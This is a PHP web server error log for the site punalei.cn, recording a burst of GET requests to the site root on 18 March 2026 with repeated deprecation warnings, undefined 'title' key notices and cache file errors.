[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:53+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:13:53+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:53+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:53+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:53+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:54+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:55+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:57+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:57+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:57+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:57+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:58+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:58+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:58+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:58+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:58+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]rmdir(/www/wwwroot/punalei/runtime/cache/4e): Directory not empty
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]mkdir(): File exists
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET www.punalei.cn/
[ error ] [2]file_get_contents(/www/wwwroot/punalei/runtime/cache/bb/4d2c7c184a0a1ab2d29f7029af4079.php): Failed to open stream: No such file or directory
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:13:59+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:00+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:01+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T09:14:01+08:00 ] 61.147.98.247 GET punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
